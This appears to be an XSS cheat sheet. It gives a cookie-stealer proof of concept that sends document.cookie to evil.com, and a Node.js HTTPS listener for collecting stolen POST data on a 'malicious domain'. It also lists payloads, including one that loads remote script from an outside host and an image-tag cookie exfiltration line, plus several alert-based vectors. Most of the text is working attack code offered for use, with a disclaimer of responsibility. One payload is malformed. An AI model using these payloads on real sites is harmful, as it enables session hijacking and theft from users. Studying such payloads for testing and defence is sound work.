### Cookie Stealer Example:

- `GET` based interception (easiest and best to show Poc):

```js
// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://evil.com/index.html/?victim_cookie=' + cookie;
window.location.href = url;
```

- `POST` based interception (I am not responsible for what you do with this info):

1. Get ssl certitficates for your malicious domain: `sudo certbot certonly --standalone -d domain.tld`
2. Setup the listener with ssl certificates

```node
const https = require('https');
const fs = require('fs');

// Load the certificate and key
const cert = fs.readFileSync('cert.pem');
const key = fs.readFileSync('privkey.pem');

// Create the HTTPS server
const server = https.createServer({ cert, key }, (req, res) => {
  if (req.method === 'POST') {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
    });
    req.on('end', () => {
      console.log(`Received data: ${data}`);
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('Data received successfully!');
    });
  } else {
    res.writeHead(405, { 'Content-Type': 'text/plain' });
    res.end('Method not allowed!');
  }
});

// Listen on port 8080
server.listen(8080, () => {
  console.log('Server listening on port 8080');
});
```

### Payloads

1. **Inject External JavaScript without `<script>` Tag:**
   
```html
<img src=x onerror="var script = document.createElement('script'); script.src = 'https://basedygt.github.io/xss.js'; document.head.appendChild(script);">
```

2. **Data Exfiltration through Image Source (when CSP is disabled):**

```html
<img src="https://evil.com/?data=" + encodeURIComponent(document.cookie)">
```

Vulnerable when

- Absence of Content-Security-Policy header in the response
- Presence of Content-Security-Policy header with a value of `default-src` or `none`

3. **CSS-Based XSS:**

```css
body { background-image: url('javascript:alert("XSS")'); }
```

4. **SVG XSS:**

```html
<svg/onload=alert(document.domain)>
```

5. **Event Handlers to Execute Payload:**

```html
<button onclick="alert('XSS')">Click Me</button>
```

6. **JavaScript Protocol Handler:**
   
```html
<a href="javascript:alert('XSS')">Click Me</a>
```
